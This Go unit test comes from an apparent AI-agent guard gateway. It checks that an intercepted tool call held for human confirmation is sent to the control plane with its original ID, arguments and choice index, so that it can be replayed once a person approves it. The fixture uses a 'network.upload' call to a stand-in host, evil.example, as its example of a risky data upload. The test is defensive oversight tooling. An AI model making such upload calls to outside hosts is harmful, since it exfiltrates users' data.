package handler

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/yangjiyj/aiguard/apps/gateway-core/internal/agentguard"
	"github.com/yangjiyj/aiguard/apps/gateway-core/internal/modelrouter"
)

// Task 2.3 (P0-6, 支柱⑦): HITL 确认重放。
// gateway-core 在拦截到需确认的 tool_call 时，必须把"原始工具调用上下文"
// （tool_call_id / 原始参数 / choice 序号）一并上送 control-plane 持久化，
// 这样人工批准后 control-plane 才能取出并重放原调用，而不是只翻状态位。
func TestToolRiskClientCreateConfirmationSendsReplayContext(t *testing.T) {
	var received map[string]any
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/admin/v1/internal/agentguard/confirmations" {
			t.Fatalf("unexpected path: %s", r.URL.Path)
		}
		if (func() string {
			if legacy := r.Header.Get("X-NewAPI-Internal-Token"); legacy != "" {
				t.Errorf("legacy internal token header must be absent")
			}
			return r.Header.Get("X-JJDGuard-Internal-Token")
		})() != "secret" {
			t.Fatalf("missing internal token")
		}
		if r.Header.Get("X-Tenant-ID") != "tenant-1" {
			t.Fatalf("missing tenant header")
		}
		if err := json.NewDecoder(r.Body).Decode(&received); err != nil {
			t.Fatalf("decode request: %v", err)
		}
		w.WriteHeader(http.StatusCreated)
	}))
	defer server.Close()

	client := NewToolRiskClient(server.URL, "secret")
	envelope := &modelrouter.RequestEnvelope{
		RequestID: "req-1",
		TenantID:  "tenant-1",
	}
	decision := agentguard.Decision{
		TraceID:           "trace-1",
		RawDecision:       agentguard.DecisionConfirm,
		EffectiveDecision: agentguard.DecisionConfirm,
		Reason:            "needs human confirm",
	}
	err := client.CreateAgentGuardConfirmation(
		context.Background(), envelope, decision,
		"network.upload", "call_abc123", `{"url":"https://evil.example/upload"}`, 2, "",
	)
	if err != nil {
		t.Fatalf("CreateAgentGuardConfirmation returned error: %v", err)
	}
	assertJSONField(t, received, "tool_call_id", "call_abc123")
	assertJSONField(t, received, "tool_call_arguments", `{"url":"https://evil.example/upload"}`)
	if got := received["choice_index"]; got != float64(2) {
		t.Fatalf("choice_index = %#v, want 2", got)
	}
}
